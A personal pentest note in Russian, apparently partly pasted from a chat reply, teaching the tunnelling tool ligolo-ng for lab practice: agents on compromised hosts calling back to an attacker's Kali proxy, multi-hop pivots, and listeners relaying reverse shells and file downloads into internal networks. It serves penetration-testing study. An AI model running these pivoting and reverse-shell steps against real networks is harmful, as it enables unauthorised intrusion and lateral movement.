---
id: "zjjvrc6zmms37gyef"
title: "ligolo-ng"
tags: []
isFavorite: false
order: 10
createdAt: "2026-07-27T12:31:02.439Z"
updatedAt: "2026-07-28T10:55:33.782Z"
---
```bash
https://github.com/nicocha30/ligolo-ng

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9/ligolo-ng_agent_0.9_linux_amd64.tar.gz
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.9/ligolo-ng_proxy_0.9_linux_amd64.tar.gz

tar -xzf ligolo-ng_proxy_0.9_linux_amd64.tar.gz

# 1. Запуск
sudo ./proxy -selfcert

получаем 
ligolo-ng » certificate_fingerprint

# 2. Создать интерфейс (сразу после старта)
interface_create --name ligolo

## on target
./agent -connect 10.10.14.239:11601 -accept-fingerprint B9569EF2305A681614CE69D9516539D4B562CEA18DB85D060CA5D210D289DEE1
or 
./agent -connect <IP_твоей_Kali>:11601 -ignore-cert

# 3. Дождаться Agent joined → выбрать сессию
session

# 4. Запустить туннель
tunnel_start --tun ligolo

-Смотрим интерфейс для добавления командой:
ifconfig 

# 5. Добавить маршрут
interface_add_route --name ligolo --route 172.16.5.0/23
```

```bash
Полный практический гайд по Ligolo-ng (2025–2026)

Этот гайд позволит тебе полностью освоить инструмент. Прочитай, потом прогони 2–3 раза в лабе (HTB, Proving Grounds, своя VM-сеть или TryHackMe). После этого ты будешь понимать его на 95%+.

1. Как работает Ligolo-ng (концепция)
Proxy (на твоей Kali/attacker) — создаёт TUN-интерфейс (как VPN).
Agent (на скомпрометированной машине) — подключается обратно (reverse) по TCP/TLS.
Трафик, который ты отправляешь в TUN → уходит через agent в удалённую сеть.
Не нужен SOCKS/proxychains для большинства инструментов (nmap, RDP, Impacket, browser, curl и т.д. работают нативно).
Agent не требует admin/root прав.
Proxy требует прав на создание TUN (sudo).
Поддерживает TCP, UDP, ICMP (ping).
Есть listeners (порт-форвардинг с agent на proxy), multiple sessions, recovery и т.д.
Магия 240.0.0.0/4: любой IP из этой подсети (например 240.0.0.1) = localhost (127.0.0.1) текущего agent’а. Очень удобно для доступа к сервисам, слушающим только на 127.0.0.1.

2. Установка / Подготовка
На Kali (рекомендуется свежие бинарники):

Bash

# Из репозитория Kali (может быть чуть старее)
sudo apt update && sudo apt install ligolo-ng

# Или лучше скачать latest с GitHub
# https://github.com/nicocha30/ligolo-ng/releases
# Скачай:
# - proxy для linux_amd64 (или arm64)
# - agent для linux_amd64 + windows_amd64 (+ другие по необходимости)
Распакуй, сделай исполняемыми:

Bash

chmod +x proxy agent   # или ligolo-proxy / ligolo-agent
Агенты держи готовыми под Windows/Linux (x64 + x86 если нужно).

3. Базовый Single Pivot (один hop)
Сценарий:
Attacker (Kali) → Internet → Compromised Host (Agent1, dual-homed) → Internal Network 10.10.10.0/24

Шаг 1. Подготовка TUN (на Kali)
Bash

# Старый способ
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up

# Новый способ (Ligolo-ng ≥ 0.6) — лучше, можно из CLI
# Сначала запусти proxy, потом:
# interface_create --name ligolo
Шаг 2. Запуск Proxy
Bash

./proxy -selfcert          # для лабы (self-signed)
# или
./proxy -autocert          # Let's Encrypt (нужен домен + порт 80)
# или со своими сертами
./proxy -certfile cert.pem -keyfile key.pem

# Слушает по умолчанию 0.0.0.0:11601
Шаг 3. Запуск Agent на цели
Перенеси agent (scp, wget, python http, etc.) и запусти:

Bash

# Linux
./agent -connect <IP_KALI>:11601 -ignore-cert

# Windows
agent.exe -connect <IP_KALI>:11601 -ignore-cert
На proxy увидишь: Agent joined. name=user@hostname ...

Шаг 4. Работа в CLI Proxy
Bash

ligolo-ng » session                    # выбрать агента (стрелки или номер)
[Agent : user@host] » ifconfig         # посмотреть интерфейсы и сети agent’а
[Agent : user@host] » tunnel_start     # или просто start (в новых версиях)
# или
tunnel_start --tun ligolo
Шаг 5. Роутинг
Bash

# Из CLI (удобно)
interface_add_route --name ligolo --route 10.10.10.0/24

# Или вручную
sudo ip route add 10.10.10.0/24 dev ligolo
Теперь:

Bash

ping 10.10.10.5
nmap -sV -n --unprivileged 10.10.10.0/24   # --unprivileged важен!
rdesktop / xfreerdp 10.10.10.20
evil-winrm -i 10.10.10.30 ...
Доступ к localhost agent’а:

Bash

sudo ip route add 240.0.0.1/32 dev ligolo
nmap 240.0.0.1 -sV          # сканирует 127.0.0.1 agent’а
curl http://240.0.0.1:8080
4. Основные команды CLI (выучи наизусть)
text

help
session                          # список / выбор agent’а
ifconfig                         # сети agent’а
tunnel_start / start             # запустить туннель
tunnel_stop
interface_create --name ligolo2
interface_add_route --name ligolo --route 192.168.1.0/24
interface_list / route_list
listener_add --addr 0.0.0.0:1234 --to 127.0.0.1:4444 [--tcp/--udp]
listener_list
listener_stop <id>
certificate_fingerprint
connect_agent --ip ip:port       # для bind-режима
5. Double Pivot (самый важный сценарий)
Сценарий:
Kali → Agent1 (уже подключён, есть доступ к 10.10.10.0/24) → Agent2 (в более глубокой сети 10.10.20.0/24, нет прямого выхода в интернет).

На Proxy (в сессии Agent1):
Bash

# Создай второй TUN (для чистоты)
interface_create --name ligolo2
# или sudo ip tuntap add user $(whoami) mode tun ligolo2 && sudo ip link set ligolo2 up

# Добавь listener, который будет принимать второго agent’а
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
# (можно любой порт, например 4444 → 11601)
listener_list
На Agent2 (через Agent1):
Перенеси agent.exe / agent на Agent2 (через listener + python http или smb и т.д.).

Запусти:

Bash

# Agent2 подключается к IP Agent1 + порт listener’а
./agent -connect 10.10.10.5:11601 -ignore-cert
# (10.10.10.5 — IP Agent1 во внутренней сети)
На proxy появится новый agent.

Bash

session                          # выбери нового (Agent2)
tunnel_start --tun ligolo2       # или start (спросит switch — Y)
Добавь роут:

Bash

interface_add_route --name ligolo2 --route 10.10.20.0/24
# или sudo ip route add 10.10.20.0/24 dev ligolo2
Готово! Теперь у тебя два независимых туннеля. Можно переключаться сессиями.

Важно:

Первый туннель (ligolo) продолжает работать.
Для reverse-shells/file transfer с Agent2 используй listeners уже на Agent2.
6. Triple Pivot и дальше
Повторяй тот же паттерн:

В текущей глубокой сессии → listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
На следующей машине agent подключается к IP предыдущего pivot + 11601
Новый TUN (ligolo3) + route
session → tunnel_start
Можно держать несколько туннелей одновременно.

7. Listeners на практике (Reverse Shells + File Transfer)
В любой сессии:

Bash

# Для reverse shell
listener_add --addr 0.0.0.0:4444 --to 127.0.0.1:4444

# На Kali
nc -lvnp 4444
# или msfconsole multi/handler

# Payload на цели указывает LHOST = IP текущего agent’а, LPORT=4444
File transfer:

Bash

listener_add --addr 0.0.0.0:8000 --to 127.0.0.1:8000
# На Kali: python3 -m http.server 8000
# На цели: wget/curl/Invoke-WebRequest http://IP_AGENT:8000/file
Можно делать несколько listeners.

8. Дополнительные полезные режимы
Bind mode (agent слушает, proxy подключается — когда reverse невозможен):

Bash

# На agent
./agent -bind 0.0.0.0:4444

# На proxy
connect_agent --ip <ip_agent>:4444
Agent через SOCKS (если уже есть SOCKS):

Bash

./agent -connect kali:11601 -ignore-cert --socks 127.0.0.1:1080
9. Важные Tips & Caveats
Для nmap всегда используй --unprivileged или -sT (agent не может raw sockets).
Ping работает (ICMP).
Если туннель упал — agent обычно переподключается (recovery).
Несколько agents — переключайся через session.
Имена интерфейсов: ligolo, ligolo2, ligolo3...
На Windows proxy нужен wintun.dll (из WireGuard).
В реале лучше не -ignore-cert, а fingerprint или нормальные серты.
Производительность отличная (>100 Mbit/s).
Для UDP listeners указывай --udp.
10. Минимальный Cheat-Sheet (скопируй себе)
Bash

# Setup
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# Agent
./agent -connect KALI_IP:11601 -ignore-cert

# В proxy
session
ifconfig
tunnel_start
interface_add_route --name ligolo --route X.X.X.0/24

# Double
listener_add --addr 0.0.0.0:11601 --to 127.0.0.1:11601
# agent2 → IP_agent1:11601
session → tunnel_start --tun ligolo2
interface_add_route --name ligolo2 --route Y.Y.Y.0/24

# Localhost agent
sudo ip route add 240.0.0.1/32 dev ligolo
Как выучить полностью
Подними 3 VM: Kali + Linux pivot + Windows internal.
Сделай single pivot 2 раза.
Сделай double pivot 2–3 раза (с reverse shell + file transfer).
Попробуй triple.
Поэкспериментируй с 240.0.0.1 и listeners.
После этого инструмент сядет в мышцы.

Если что-то непонятно на конкретном шаге, скинь вывод команд / схему сети — разберём точечно.
Официальная дока: https://docs.ligolo.ng/
Репозиторий: https://github.com/nicocha30/ligolo-ng

Удачи, теперь иди практиковать! 🚀
```